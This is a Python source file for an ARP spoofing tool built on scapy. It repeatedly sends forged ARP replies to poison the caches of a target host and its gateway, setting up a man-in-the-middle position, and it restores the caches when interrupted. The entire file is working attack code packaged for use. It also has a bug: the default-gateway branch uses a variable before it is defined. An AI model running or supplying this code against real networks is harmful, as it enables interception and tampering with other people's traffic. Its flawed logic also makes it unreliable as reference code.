import sys
import time
import scapy.all as scapy
from rich import print

from resources.services import DeviceInfo

"""
----  TO DO:  ----
def enable_ip_route();
"""

def ScapyArpSpoofer(target, host, timing, verbose):

    #creating and sending an arp packet that modifies the arp table of both target and gateway  
    def spoofer(destination, source, mac_address):
        packet = scapy.ARP(op=2, pdst=destination, hwdst=mac_address, psrc=source)
        scapy.send(packet, verbose=False)


    #creating and sending an arp packet that restores the arp tables values
    def restore_cache(destination, source, dest_mac, source_mac):
        packet = scapy.ARP(op=2, pdst=destination, hwdst=dest_mac, psrc=source, hwsrc=source_mac)
        scapy.send(packet, verbose=False)


    #if the host is not given, gets the default gateway
    if not host:
        host = info.get_default_gateway()
        print(f"[bold green][+][/bold green] Your default gateway is {host}.")


    try:
        info = DeviceInfo()
        target_mac = info.get_mac(target)
        host_mac = info.get_mac(host)
        packets_count = 0

        while True:
            spoofer(target, host, target_mac)
            spoofer(host, target, host_mac)
            packets_count = packets_count + 2

            if verbose:
                print(f"[bold green][+][/bold green] Sent to [green]{target}[/green] : [green]{host}[/green] at [green]{scapy.ARP().hwsrc}[/green]")
                print(f"[bold green][+][/bold green] Packets sent: [green]{packets_count}[/green]")
                print("[bold]-[/bold]" * 40)

            time.sleep(timing)
    
    #restoring cache before interrupting the script
    except KeyboardInterrupt:
        print("\n[bold yellow][-][/bold yellow] Restoring cache[white]...[/white]")
        restore_cache(target, host, target_mac, host_mac)
        restore_cache(host, target, host_mac, target_mac)
        print(f"[bold green][+][/bold green] Cache restored.")
        sys.exit()

    except Exception as e:
        print(f"[bold red][!] ERROR: {str(e)}[/bold red]")
        
        try:
            restore_cache(target, host, target_mac, host_mac)
            restore_cache(host, target, host_mac, target_mac)
            print(f"[bold green][+][/bold green] Cache restored.")
            sys.exit(1)

        except:
            sys.exit(1)



if __name__ == '__main__':
    pass
